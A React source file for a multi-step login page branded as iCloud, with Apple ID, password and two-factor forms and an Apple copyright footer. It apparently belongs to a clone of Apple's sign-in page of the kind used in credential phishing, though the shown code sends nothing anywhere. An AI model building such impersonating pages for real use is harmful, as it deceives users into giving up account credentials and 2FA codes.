import React from 'react';
import { useAuth } from '../context/AuthContext';
import AppleIDForm from '../components/login/AppleIDForm';
import PasswordForm from '../components/login/PasswordForm';
import TwoFactorForm from '../components/login/TwoFactorForm';
import ErrorMessage from '../components/login/ErrorMessage';

const LoginPage: React.FC = () => {
  const { currentStep } = useAuth();
  
  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Header */}
      <header className="bg-white shadow-sm py-4">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <img src="/files_4768916-1748599339329-image.png" alt="iCloud" className="h-8" />
        </div>
      </header>
      
      {/* Content */}
      <main className="flex-1 flex items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
        {currentStep === 'apple-id' && <AppleIDForm />}
        {currentStep === 'password' && <PasswordForm />}
        {currentStep === 'two-factor' && <TwoFactorForm />}
        {currentStep === 'error' && <ErrorMessage />}
      </main>
      
      {/* Footer */}
      <footer className="bg-gray-50 py-4">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between text-sm text-gray-500">
            <div className="flex space-x-4">
              <a href="#" className="hover:text-gray-700">System Status</a>
              <a href="#" className="hover:text-gray-700">Privacy Policy</a>
              <a href="#" className="hover:text-gray-700">Terms & Conditions</a>
            </div>
            <div>
              <p>Copyright © 2025 Apple Inc. All rights reserved.</p>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default LoginPage;